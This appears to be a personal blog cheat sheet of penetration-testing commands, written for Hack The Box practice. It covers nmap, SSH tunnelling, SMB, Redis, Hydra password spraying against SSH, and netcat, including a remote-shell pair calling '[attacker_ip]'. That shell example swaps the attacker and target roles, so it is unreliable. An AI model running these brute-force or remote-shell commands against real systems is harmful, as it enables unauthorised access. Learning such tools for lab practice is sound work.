---
title: "Useful Notes"
date: 2024-08-25T13:38:26Z
draft: false
author: "James"
tags: 
  - "Security"
  - "Penetration-Testing"
  - "Linux"
summary: "A page dedicated to quick and easy commands used."
---

## Introduction

I have decided to start progressing on Hack The Box while I have some free time to sharpen my skills and knowledge. 

## Useful commands 

#### Nmap

```nmap -F IPADDRESS``` - Fast scan the top 100 ports
```nmap -sV IPADDRESS``` - Service version detection
```nmap -O IPADDRESS``` - Operating system detection 
```nmap -sT IPADDRESS```- TCP Scan
```nmap -p- IPADDRESS```- Scan all ports

#### SSH

SSH Tunnelling to establish a connection with the remote ssh server and will listen for connections on the local port 1234 and forward to remote server on port 22. We can then access the services on the remote machine as if they were running locally. 
```ssh -L 1234:localhost:22 user@{target_IP}```

#### SMB

```smbclient -L``` is used to list file shares.

```smbclient -L \\IPADDRESS -U anonymous```
  Use tag "-W" to specify the workgroup.

Use ```get``` & ```put``` retrospecifively to download/upload files.

#### Redis
```redis-cli -u redis://host:port``` - To connect
```redis-cli -h``` - To get hostname

Once connected, run the ```info``` command to get the information about the system. 

Run the ```select``` command to enter the database.

#### Samba

```smbmap -H 10.10.10.3``` - Find shares

#### FTP

The below result from an Nmap scan shows the server allows anonymous logins:

```ftp-anon: Anonymous FTP login allowed (FTP code 230)```

#### Passwords

We can use Hydra to iterate through usernames and use the same password for each user via SSH:

```hydra -L users.txt -p 'PASSWORD' {target_IP} ssh```

#### Network Sockets

The command `ss -tlnp` is used to display detailed information about network sockets on a Linux system. Here's a breakdown of what each option means:

- **`ss`**: This is the command used to display network socket information (similar to `netstat`, but faster and more powerful).
  
- **`-t`**: Show **TCP** sockets only.
  
- **`-l`**: Show only **listening** sockets (i.e., sockets that are waiting for incoming connections, such as servers).

- **`-n`**: Show numerical addresses and ports instead of resolving hostnames or service names. For example, it shows `127.0.0.1` instead of `localhost`, and `80` instead of `http`.

- **`-p`**: Show the **process** using the socket, along with the PID (Process ID) and the name of the program.

### Example output:
```bash
State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
LISTEN  0       128     127.0.0.1:5432       0.0.0.0:*          users:(("postgres",pid=12345,fd=7))
LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          users:(("sshd",pid=6789,fd=3))


#### Netcat

Netcat (or nc) is a versatile networking tool that is often referred to as the "Swiss Army knife" of networking. It is used for a variety of tasks involving network connections

```bash
# 1. Basic Syntax
nc [options] [hostname] [port]

# 2. Start a TCP Server
nc -l -p 1234

# 3. Connect to a TCP Server
nc [hostname] 1234

# 4. File Transfer
# On the server (receiving):
nc -l -p 1234 > received_file
# On the client (sending):
nc [server_ip] 1234 < file_to_send

# 5. Port Scanning
nc -zv [hostname] [port_range]
# Example:
nc -zv localhost 20-80

# 6. Simple Chat
# Listener:
nc -l -p 1234
# Connector:
nc [hostname] 1234

# 7. UDP Mode
# Send UDP packets:
nc -u [hostname] 1234
# Listen for UDP packets:
nc -u -l -p 1234

# 8. Remote Shell
# Listener (attacker's machine):
nc -l -p 4444 -e /bin/bash
# Client (target's machine):
nc [attacker_ip] 4444

# 9. Check if a Port is Open
nc -zv [hostname] [port]
# Example:
nc -zv example.com 80

# 10. Set a Timeout
nc -w 3 [hostname] 1234
